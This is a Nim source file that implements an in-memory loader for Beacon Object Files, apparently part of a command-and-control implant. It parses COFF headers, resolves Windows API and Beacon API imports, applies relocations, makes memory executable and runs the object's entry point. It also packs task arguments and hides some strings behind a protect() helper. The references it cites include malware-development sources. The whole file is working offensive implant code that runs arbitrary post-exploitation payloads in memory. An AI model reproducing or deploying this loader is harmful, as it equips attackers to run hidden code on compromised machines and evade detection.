import winim/lean
import os, strformat, strutils, ptr_math
import ./beacon
import ../../common/[types, utils, serialize]

#[
    Object file loading involves the following steps
    1. Calculate and allocate memory required to hold the object file sections and symbols
    2. Copy option sections into the newly allocated memory
    3. Parse and resolve function symbols 
    4. Perform section relocations 
    5. Change memory protection and execute the entry point function

    References: 
    - https://maldevacademy.com/new/modules/51
    - https://github.com/m4ul3r/malware/blob/main/nim/coff_loader/main.nim
    - https://github.com/frkngksl/NiCOFF/blob/main/Main.nim 
]#

# Type definitions 
type 
    SECTION_MAP = object
        base: PVOID
        size: ULONG

    PSECTION_MAP = ptr SECTION_MAP

    OBJECT_CTX_UNION {.union.} = object 
        base: ULONG_PTR
        header: PIMAGE_FILE_HEADER

    OBJECT_CTX {.pure.} = object 
        union: OBJECT_CTX_UNION
        symTbl: PIMAGE_SYMBOL 
        symMap: ptr PVOID 
        secMap: PSECTION_MAP
        sections: PIMAGE_SECTION_HEADER

    POBJECT_CTX = ptr OBJECT_CTX

    # For entry point execution
    EntryPoint = proc(args: PBYTE, argc: ULONG): void {.stdcall.}

# Macro for page alignment ( important for calculating the total virtual memory required for the object file to be loaded and executed)
# #define PAGE_ALIGN( x ) (((ULONG_PTR)x) + ((SIZE_OF_PAGE - (((ULONG_PTR)x) & (SIZE_OF_PAGE - 1))) % SIZE_OF_PAGE))
const PAGE_SIZE = 0x1000
template PAGE_ALIGN(address: auto): uint = 
    if cast[uint](address) mod PAGE_SIZE == 0:
        cast[uint](address)
    else:
        cast[uint](cast[uint](address) + ((PAGE_SIZE - ((cast[uint](address) and (PAGE_SIZE - 1))) mod PAGE_SIZE)))

#[
    Calculates required memory size 
]#
proc objectVirtualSize(objCtx: POBJECT_CTX): ULONG = 

    var 
        objRel: PIMAGE_RELOCATION
        objSym: PIMAGE_SYMBOL 
        symbol: PSTR
        length: ULONG

    var sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](objCtx.sections)

    # Calculate size of the sections 
    for i in 0 ..< int(objCtx.union.header.NumberOfSections): 
        length += ULONG(PAGE_ALIGN(sections[i].SizeOfRawData))

    # Calculate function map size 
    for i in 0 ..< int(objCtx.union.header.NumberOfSections): 
        objRel = cast[PIMAGE_RELOCATION](objCtx.union.base + sections[i].PointerToRelocations)

        # Iterate over section relocations to retrieve symbols
        for j in 0 ..< int(sections[i].NumberOfRelocations): 
            objSym = cast[PIMAGE_SYMBOL](objCtx.symTbl + cast[int](objRel.SymbolTableIndex))        
            # dump objSym.repr

            # Retrieve symbol name 
            if objSym.N.Name.Short != 0: 
                # Short name
                symbol = cast[PSTR](addr objSym.N.ShortName)

            else: 
                # Long name
                symbol = cast[PSTR]((cast[uint](objCtx.symTbl) + uint(objCtx.union.header.NumberOfSymbols) * uint(sizeof(IMAGE_SYMBOL))) + cast[uint](objSym.N.Name.Long))

            # Check if symbol starts with `__ipm_` (imported functions)
            if ($symbol).startsWith("__imp_"): 
                length += ULONG(sizeof(PVOID))
            # echo $symbol

            # Handle next relocation item/symbol
            objRel = cast[PIMAGE_RELOCATION](cast[int](objRel) + sizeof(IMAGE_RELOCATION))

    return ULONG(PAGE_ALIGN(length))

#[
    Symbol resolution
]#
proc strchr*(str: pointer, c: char): pointer =
    var pStr = cast[ptr char](str)
    while (pStr[] != '\0') and (pStr[] != c):
        pStr = cast[ptr char](cast[int](pStr) + 1)

    if pStr[] == c:
        return cast[pointer](pStr)
    else:
        return nil

proc objectResolveSymbol(symbol: var PSTR): PVOID = 

    var 
        resolved: PVOID 
        function: PSTR 
        library: PSTR 
        pos: PCHAR 
        buffer: array[MAX_PATH, char]
        hModule: HANDLE

    if symbol == NULL: 
        return NULL 

    # Remove the `__imp_` prefix from the symbol (6 bytes)
    symbol = cast[PSTR](cast[uint](symbol) + 6)

    # Check if the symbol is a Beacon API function
    if ($symbol).startsWith(protect("Beacon")): 
        for i in 0 ..< beaconApiAddresses.len(): 
            if $symbol == beaconApiAddresses[i].name: 
                resolved = beaconApiAddresses[i].address
    
    else:
        # Resolve a external Win32 API function
        # For external APIs, we will need to parse symbols formatted as LIBRARY$Function
    
        zeroMem(addr buffer[0], MAX_PATH)
        copyMem(addr buffer[0], symbol, ($symbol).len())

        # Replace `$` to separate library and function
        pos = cast[PSTR](strchr(addr buffer[0], '$'))
        pos[] = '\0' 

        library = cast[PSTR](addr buffer[0]) 
        function = cast[PSTR](cast[uint](pos) + 1)

        # Resolve the library instance 
        hModule = GetModuleHandleA(library)
        if hModule == 0:
            hModule = LoadLibraryA(library)
            if hModule == 0: 
                raise newException(CatchableError, fmt"Library {$library} not found.")

        # Resolve the function from the loaded library 
        resolved = GetProcAddress(hModule, function)
        if resolved == NULL: 
            raise newException(CatchableError, fmt"Function {$function} not found in {$library}.")

    echo fmt"    [>] {$symbol} @ 0x{resolved.repr}"

    RtlSecureZeroMemory(addr buffer[0], sizeof(buffer))

    return resolved

#[
    Object relocation
    Arguments: 
    - uType: Type of relocation to perform
    - pRelocAddress: Address where the relocation will be applied
    - pSecBase: Base address of the section in the newly allocated object file, where the relocation needs to occur
]#
proc objectRelocation(uType: ULONG, pRelocAddress: PVOID, pSecBase: PVOID) =
    var
        offset32: ULONG32
        offset64: ULONG64

    case(uType)
    of IMAGE_REL_AMD64_REL32:
       cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32)
    of IMAGE_REL_AMD64_REL32_1:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 1)
    of IMAGE_REL_AMD64_REL32_2:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 2)
    of IMAGE_REL_AMD64_REL32_3:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 3)
    of IMAGE_REL_AMD64_REL32_4:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 4)
    of IMAGE_REL_AMD64_REL32_5:
        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 5)
    of IMAGE_REL_AMD64_ADDR64:
        cast[PUINT64](pRelocAddress)[] = cast[UINT64](cast[uint](cast[PUINT64](pRelocAddress)[]) + (cast[uint](pSecBase)))
    else: discard

#[
    Section processing
]#
proc objectProcessSection(objCtx: POBJECT_CTX): bool = 
    
    var 
        secBase: PVOID 
        secSize: ULONG 
        objRel: PIMAGE_RELOCATION
        objSym: PIMAGE_SYMBOL
        symbol: PSTR 
        resolved: PVOID 
        reloc: PVOID 
        fnIndex: ULONG

    var 
        sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](objCtx.sections)
        secMap = cast[ptr UncheckedArray[SECTION_MAP]](objCtx.secMap)
        symMap = cast[ptr UncheckedArray[PVOID]](objCtx.symMap)

    # Process and relocate object file sections
    for i in 0 ..< int(objCtx.union.header.NumberOfSections): 
        objRel = cast[PIMAGE_RELOCATION](objCtx.union.base + sections[i].PointerToRelocations)

        # Iterate over section relocations to retrieve symbols
        for j in 0 ..< int(sections[i].NumberOfRelocations): 
            objSym = cast[PIMAGE_SYMBOL](objCtx.symTbl + cast[int](objRel.SymbolTableIndex))        

            # Retrieve symbol name 
            if objSym.N.Name.Short != 0: 
                # Short name
                symbol = cast[PSTR](addr objSym.N.ShortName)

            else: 
                # Long name
                symbol = cast[PSTR]((cast[uint](objCtx.symTbl) + uint(objCtx.union.header.NumberOfSymbols) * uint(sizeof(IMAGE_SYMBOL))) + cast[uint](objSym.N.Name.Long))

            # Retrieve address to perform relocation
            reloc = cast[PVOID](cast[uint](secMap[i].base) + uint(objRel.union1.VirtualAddress))
            resolved = NULL 

            # Check if symbol starts with `__ipm_` (imported functions)
            if ($symbol).startsWith("__imp_"): 

                # Resolve the imported function
                resolved = objectResolveSymbol(symbol)
                if resolved == NULL: 
                    return false
            
            # Perform relocation on the imported function 
            if (objRel.Type == IMAGE_REL_AMD64_REL32) and (resolved != NULL): 
                symMap[fnIndex] = resolved 
                cast[PUINT32](reloc)[] = cast[UINT32]((cast[uint](objCtx.symMap) + uint(fnIndex) * uint(sizeof(PVOID))) - cast[uint](reloc) - uint(sizeof(uint32)))
                inc fnIndex

            else: 
                secBase = secMap[objSym.SectionNumber - 1].base

                # Perform relocation on the section
                objectRelocation(cast[ULONG](objRel.Type), reloc, secBase)

            # Handle net relocation item/symbol
            objRel = cast[PIMAGE_RELOCATION](cast[int](objRel) + sizeof(IMAGE_RELOCATION))

    return true

#[
    Object file execution
    Arguments: 
    - objCtx: Object context
    - entry: Name of the entry function to be executed
    - args: Arguments passed to the object file
]#
proc objectExecute(objCtx: POBJECT_CTX, entry: PSTR, args: seq[byte]): bool = 

    var 
        objSym: PIMAGE_SYMBOL
        symbol: PSTR 
        secBase: PVOID 
        secSize: ULONG 
        oldProtect: ULONG 

    var secMap = cast[ptr UncheckedArray[SECTION_MAP]](objCtx.secMap)

    for i in 0 ..< int(objCtx.union.header.NumberOfSymbols): 
        objSym = cast[PIMAGE_SYMBOL](objCtx.symTbl + i)     
        
        # Retrieve symbol name 
        if objSym.N.Name.Short != 0: 
            # Short name
            symbol = cast[PSTR](addr objSym.N.ShortName)

        else: 
            # Long name
            symbol = cast[PSTR]((cast[uint](objCtx.symTbl) + uint(objCtx.union.header.NumberOfSymbols) * uint(sizeof(IMAGE_SYMBOL))) + cast[uint](objSym.N.Name.Long))

        # Check if the function is defined within the object file 
        if ISFCN(objSym.Type) and ($symbol == $entry): 
            # Change the memory protection of the section to make it executable 
            secBase = secMap[objSym.SectionNumber - 1].base 
            secSize = secMap[objSym.SectionNumber - 1].size

            # Change the memory protection from [RW-] to [R-X]
            if VirtualProtect(secBase, secSize, PAGE_EXECUTE_READ, addr oldProtect) == 0: 
                raise newException(CatchableError, $GetLastError())

            # Execute BOF entry point 
            var entryPoint = cast[EntryPoint](cast[uint](secBase) + cast[uint](objSym.Value))
            
            if args.len > 0:
                entryPoint(addr args[0], cast[ULONG](args.len()))
            else: 
                entryPoint(NULL, 0)

            # Revert the memory protection change
            if VirtualProtect(secBase, secSize, oldProtect, addr oldProtect) == 0: 
                raise newException(CatchableError, $GetLastError())

            return true

    return false

#[
    Loads, parses and executes a object file in memory

    Arguments:
    - objectFile: Bytes of the object file
    - args: Bytes of the COFF arguments
    - entryFunction: Name of the entry function to look for, usually "go"
]#
proc inlineExecute*(objectFile: seq[byte], args: seq[byte] = @[], entryFunction: string = "go"): bool = 
    
    var 
        objCtx: OBJECT_CTX
        virtSize: ULONG
        virtAddr: PVOID 
        secSize: ULONG
        secBase: PVOID 

    var pObject = addr objectFile[0]
    if pObject == NULL or entryFunction == NULL: 
        raise newException(CatchableError, "Arguments pObject and entryFunction are required.")

    # Parsing the object file's file header, symbol table and sections
    objCtx.union.header = cast[PIMAGE_FILE_HEADER](pObject)
    objCtx.symTbl       = cast[PIMAGE_SYMBOL](cast[int](pObject) + cast[int](objCtx.union.header.PointerToSymbolTable))
    objCtx.sections     = cast[PIMAGE_SECTION_HEADER](cast[int](pObject) + sizeof(IMAGE_FILE_HEADER))

    # echo objCtx.union.header.repr
    # echo objCtx.symTbl.repr
    # echo objCtx.sections.repr

    # Verifying that the object file's architecture is x64
    when defined(amd64): 
        if objCtx.union.header.Machine != IMAGE_FILE_MACHINE_AMD64: 
            raise newException(CatchableError, "Only x64 object files are supported")
    else: 
        raise newException(CatchableError, "Only x64 object files are supported")

    # Calculate required virtual memory
    virtSize = objectVirtualSize(addr objCtx)
    echo fmt"[*] Virtual size of object file: {virtSize} bytes"

    # Allocate memory 
    virtAddr = VirtualAlloc(NULL, virtSize, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
    if virtAddr == NULL: 
        raise newException(CatchableError, $GetLastError())

    # Allocate heap memory to store section map array
    objCtx.secMap = cast[PSECTION_MAP](HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, int(objCtx.union.header.NumberOfSections) * sizeof(SECTION_MAP)))
    if objCtx.secMap == NULL: 
        raise newException(CatchableError, $GetLastError())
    
    echo fmt"[*] Virtual memory allocated for object file at 0x{virtAddr.repr} ({virtSize} bytes)"
    
    # Set the section base to the allocated memory
    secBase = virtAddr

    # Copy over sections into the newly allocated virtual memory
    var 
        sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](objCtx.sections)
        secMap = cast[ptr UncheckedArray[SECTION_MAP]](objCtx.secMap)

    echo "[*] Copying over sections."
    for i in 0 ..< int(objCtx.union.header.NumberOfSections): 
        secSize = sections[i].SizeOfRawData
        secMap[i].size = secSize
        secMap[i].base = secBase

        # Copy over section data
        copyMem(secBase, cast[PVOID](objCtx.union.base + cast[int](sections[i].PointerToRawData)), secSize)
        echo fmt"    [>] {$(addr sections[i].Name)} @ 0x{secBase.repr} ({secSize} bytes))"

        # Get the next page entry
        secBase = cast[PVOID](PAGE_ALIGN(cast[uint](secBase) + uint(secSize)))

    # The last page of the memory is the symbol/function map
    objCtx.symMap = cast[ptr PVOID](secBase)

    echo "[*] Processing sections and performing relocations."
    if not objectProcessSection(addr objCtx): 
        raise newException(CatchableError, "Failed to process sections.")

    # Executing the object file 
    echo "[*] Executing."
    if not objectExecute(addr objCtx, entryFunction, args): 
        raise newException(CatchableError, fmt"Failed to execute function {$entryFunction}.")
    echo "[+] Object file executed successfully."
    
    return true

#[ 
    Execute a object file in memory and retrieve the output using the BeaconGetOutputData API
    Arguments:
    - objectFile: Bytes of the object file
    - args: Bytes of the COFF arguments
    - entryFunction: Name of the entry function to look for, usually "go"
]#
proc inlineExecuteGetOutput*(objectFile: seq[byte], args: seq[byte] = @[], entryFunction: string = "go"): string = 

    if not inlineExecute(objectFile, args, entryFunction): 
        raise newException(CatchableError, fmt"[-] Failed to execute object file.")

    var output = BeaconGetOutputData(NULL)
    return $output

#[
    Process the COFF arguments according to: 
    https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py 
]#
proc generateCoffArguments*(args: seq[TaskArg]): seq[byte] =     
    
    var packer = Packer.init() 
    for arg in args: 

        # All arguments passed to the beacon object file via the 'bof' command are handled as regular ANSI string
        # As some BOFs however, take different argument types, prefixes can be used to indicate the exact data type
        # [i]: INT
        # [s]: SHORT
        # [w]: WIDE STRING (utf-8)

        if arg.argType == uint8(types.STRING): 

            try: 
                let 
                    prefix = Bytes.toString(arg.data)[0..3]
                    value = Bytes.toString(arg.data)[4..^1]

                # Check the first two characters for a type specification 
                case prefix: 
                of protect("[i]:"): 
                    # Handle argument as integer
                    let intValue: uint32 = cast[uint32](parseUint(value)) 
                    packer.add(intValue)

                of protect("[s]:"): 
                    # Handle argument as short 
                    let shortValue: uint16 = cast[uint16](parseUint(value))
                    packer.add(shortValue)

                of protect("[w]:"):
                    # Handle argument as wide string  
                    # Add terminating NULL byte to the end of string arguments
                    let wStrData = cast[seq[byte]](+$value) # +$ converts a string to a wstring
                    packer.add(uint32(wStrData.len()))
                    packer.addData(wStrData)

                else: 
                    # In case no prefix is specified, handle the argument as a regular string
                    raise newException(IndexDefect, "")

            except IndexDefect: 
                # Handle argument as regular string
                # Add terminating NULL byte to the end of string arguments
                let data = arg.data & @[uint8(0)]
                packer.add(uint32(data.len()))
                packer.addData(data)
    
        else: 
            # Argument is not passed as a string, but instead directly as a int or short 
            # Primarily for alias functions where the exact data types are defined 
            packer.addData(arg.data)

    let argBytes = packer.pack() 

    return uint32.toBytes(uint32(argBytes.len())) & argBytes 
